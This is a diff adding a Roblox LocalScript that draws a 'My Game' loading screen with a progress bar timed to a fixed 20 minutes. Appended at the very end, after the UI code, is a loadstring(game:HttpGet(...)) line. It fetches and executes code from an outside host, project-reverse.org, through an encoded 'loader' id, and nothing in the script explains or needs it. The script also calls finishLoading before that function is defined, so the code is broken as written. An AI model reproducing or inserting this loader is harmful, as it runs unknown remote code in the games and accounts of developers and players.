@@ -1,1 +1,144 @@
+-- LocalScript → Put in StarterGui
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CompactLoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 9999
+screenGui.Parent = playerGui
+
+-- Container
+local container = Instance.new("Frame", screenGui)
+container.Size = UDim2.new(0, 420, 0, 260)
+container.Position = UDim2.new(0.5, -210, 0.5, -130)
+container.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+container.BorderSizePixel = 0
+
+Instance.new("UICorner", container).CornerRadius = UDim.new(0, 12)
+
+local stroke = Instance.new("UIStroke", container)
+stroke.Color = Color3.fromRGB(70, 70, 80)
+stroke.Thickness = 1.5
+
+-- Title
+local title = Instance.new("TextLabel", container)
+title.Size = UDim2.new(1, 0, 0, 50)
+title.BackgroundTransparency = 1
+title.Text = "My Game"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+
+-- Subtitle
+local subtitle = Instance.new("TextLabel", container)
+subtitle.Size = UDim2.new(1, 0, 0, 30)
+subtitle.Position = UDim2.new(0, 0, 0, 55)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Loading"
+subtitle.TextColor3 = Color3.fromRGB(170, 170, 180)
+subtitle.TextScaled = true
+subtitle.Font = Enum.Font.GothamMedium
+
+-- Progress Bar
+local barContainer = Instance.new("Frame", container)
+barContainer.Size = UDim2.new(0.85, 0, 0, 18)
+barContainer.Position = UDim2.new(0.075, 0, 0.45, 0)
+barContainer.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+barContainer.BorderSizePixel = 0
+Instance.new("UICorner", barContainer).CornerRadius = UDim.new(0, 9)
+
+local progressBar = Instance.new("Frame", barContainer)
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 9)
+
+-- Percentage
+local percentText = Instance.new("TextLabel", container)
+percentText.Size = UDim2.new(1, 0, 0, 30)
+percentText.Position = UDim2.new(0, 0, 0.62, 0)
+percentText.BackgroundTransparency = 1
+percentText.Text = "0%"
+percentText.TextColor3 = Color3.fromRGB(200, 200, 210)
+percentText.TextScaled = true
+percentText.Font = Enum.Font.GothamSemibold
+
+-- Tip
+local tip = Instance.new("TextLabel", container)
+tip.Size = UDim2.new(0.9, 0, 0, 40)
+tip.Position = UDim2.new(0.05, 0, 0.8, 0)
+tip.BackgroundTransparency = 1
+tip.Text = "This might take a while... grab a snack ☕"
+tip.TextColor3 = Color3.fromRGB(130, 130, 140)
+tip.TextScaled = true
+tip.TextWrapped = true
+tip.Font = Enum.Font.Gotham
+
+local loadingComplete = false
+local TOTAL_TIME = 20 * 60
+local startTime = tick()
+
+-- Dot Animation with Heartbeat
+local dots = 0
+local dotConn = RunService.Heartbeat:Connect(function()
+    if loadingComplete then 
+        dotConn:Disconnect()
+        return 
+    end
+    dots = (dots % 3) + 1
+    subtitle.Text = "Loading" .. string.rep(".", dots)
+end)
+
+-- 20 Minute Progress
+local progressConn = RunService.Heartbeat:Connect(function()
+    if loadingComplete then 
+        progressConn:Disconnect()
+        return 
+    end
+    
+    local elapsed = tick() - startTime
+    local progress = math.min(100, (elapsed / TOTAL_TIME) * 100)
+    
+    progressBar:TweenSize(UDim2.new(progress/100, 0, 1, 0), "Out", "Linear", 0.25, true)
+    percentText.Text = math.floor(progress) .. "%"
+    
+    if progress >= 100 then
+        finishLoading()
+    end
+end)
+
+local function finishLoading()
+    if loadingComplete then return end
+    loadingComplete = true
+    
+    subtitle.Text = "Welcome!"
+    
+    local tweenInfo = TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    
+    local tweens = {
+        TweenService:Create(container, tweenInfo, {BackgroundTransparency = 1}),
+        TweenService:Create(title, tweenInfo, {TextTransparency = 1}),
+        TweenService:Create(subtitle, tweenInfo, {TextTransparency = 1}),
+        TweenService:Create(barContainer, tweenInfo, {BackgroundTransparency = 1}),
+        TweenService:Create(progressBar, tweenInfo, {BackgroundTransparency = 1}),
+        TweenService:Create(percentText, tweenInfo, {TextTransparency = 1}),
+        TweenService:Create(tip, tweenInfo, {TextTransparency = 1})
+    }
+    
+    for _, t in ipairs(tweens) do 
+        t:Play() 
+    end
+    
+    tweens[1].Completed:Connect(function()
+        screenGui:Destroy()
+    end)
+end
+
+-- Auto close if game loads early (no wait)
+game.Loaded:Connect(finishLoading)
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNlNjBmZGFkLTY5N2EtNDI4Yi04YjgzLTQ0MTBmYzVkNWQxNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
